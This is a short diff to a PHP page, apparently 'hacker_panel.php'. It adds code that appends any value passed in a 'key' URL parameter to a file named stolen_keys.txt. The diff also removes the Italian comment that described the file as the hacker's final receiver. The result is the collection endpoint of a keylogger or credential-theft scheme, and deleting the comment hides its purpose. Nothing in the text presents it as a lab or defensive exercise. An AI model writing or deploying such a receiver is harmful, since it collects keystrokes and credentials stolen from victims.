@@ -1,7 +1,12 @@
 <?php
-// hacker_panel.php - Il ricevitore finale dell'hacker
 $file_hacker = '/var/www/htmltxt/stolen_keys.txt';
+if (isset($_GET['key'])) {
+    $tasto = $_GET['key'];
+    file_put_contents($file_hacker, $tasto, FILE_APPEND);
+}
 ?>
+
+
 <!DOCTYPE html>
 <html>
 <head>
